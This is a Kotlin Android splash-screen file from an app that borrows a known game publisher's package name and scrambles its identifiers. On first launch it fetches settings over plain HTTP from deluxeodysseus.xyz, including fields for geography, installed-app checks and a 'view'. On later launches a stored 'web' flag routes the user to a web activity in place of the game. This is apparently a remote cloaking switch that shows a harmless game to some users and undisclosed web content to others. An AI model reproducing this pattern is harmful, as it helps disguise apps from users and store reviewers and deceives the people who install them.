package com.kooapps.stackybirdandroidw.splachscrenetto

import android.content.Context
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.widget.Toast
import com.kooapps.stackybirdandroidw.R
import com.kooapps.stackybirdandroidw.mamitaclasita.MadreClasses.Companion.pampampapapapapapapapa
import com.kooapps.stackybirdandroidw.gamamama.gameActivity.GamefiAct
import com.kooapps.stackybirdandroidw.helperititka.HelperPelper
import com.kooapps.stackybirdandroidw.infiniti.InfluinitiActivity
import com.kooapps.stackybirdandroidw.secondactivitita.VtoroeActivity
import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers
import io.reactivex.rxjava3.disposables.CompositeDisposable
import io.reactivex.rxjava3.schedulers.Schedulers
import retrofit2.Retrofit
import retrofit2.adapter.rxjava3.RxJava3CallAdapterFactory
import retrofit2.converter.gson.GsonConverterFactory

class SplachScreamDija : AppCompatActivity() {
    private var mCompositeDisposableewqekjqwehqkweqwjkewhk: CompositeDisposable? = null


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splach_screen)

        val helpqwekjqwhejkqwehqwkeqwehqwkeq = HelperPelper()


        val prefswerwehrjkwehrwejkrw = getSharedPreferences("ActivityPREF", MODE_PRIVATE)
        if (prefswerwehrjkwehrwejkrw.getBoolean("activity_exec", false)) {
            val prefsInceptioneqweklqweklqwejklqwe = getSharedPreferences("NEWPR", Context.MODE_PRIVATE)
            val entryCodeqweqweqweqweweq =  prefsInceptioneqweklqweklqwejklqwe.getString("ENTRY_CODE", "0")
            if (entryCodeqweqweqweqweweq == "web"){
                startActivity(Intent(this, InfluinitiActivity::class.java))
                finish()
            } else {
                startActivity(Intent(this, GamefiAct::class.java))
                finish()
            }
        } else {
            val execwqeqwjheqwejkhqwk = prefswerwehrjkwehrwejkrw.edit()
            execwqeqwjheqwejkhqwk.putBoolean("activity_exec", true)
            execwqeqwjheqwejkhqwk.apply()

            helpqwekjqwhejkqwehqwkeqwehqwkeq.deepLeqwkleqwjheklqwhddweqedqw(this)


            mCompositeDisposableewqekjqwehqkweqwjkewhk = CompositeDisposable()

            val requestInterfaceweqjkehqwkeqwheqwjkeh = Retrofit.Builder()
                .baseUrl("http://deluxeodysseus.xyz/")
                .addCallAdapterFactory(RxJava3CallAdapterFactory.create())
                .addConverterFactory(GsonConverterFactory.create())
                .build().create(HelperPelper.RequestInterfacewewqheqwjkehqwkeq::class.java)

            mCompositeDisposableewqekjqwehqkweqwjkewhk?.add(
                requestInterfaceweqjkehqwkeqwheqwjkeh.getDatakelqwjelqjkqwelj()
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribeOn(Schedulers.io())
                    .subscribe({ response -> onResponseweqwewgejqwhegwqjehqwgeqj(response) }, { t -> onFailurewewqeqweqwgheqwjheqwg(t) })
            )
        }





    }
    private fun onResponseweqwewgejqwhegwqjehqwgeqj(response: HelperPelper.RetroBewqkleejwlkejqwelwe) {
        pampampapapapapapapapa["AppsCh"] = response.odysseusappsChecker
        pampampapapapapapapapa["GeoHose"] = response.odysseusgeo
        pampampapapapapapapapa["View"] = response.odysseusview
        startActivity(Intent(this, VtoroeActivity::class.java))
        finish()
    }

    private fun onFailurewewqeqweqwgheqwjheqwg(t: Throwable) {
        Toast.makeText(this,t.message, Toast.LENGTH_SHORT).show()
    }


}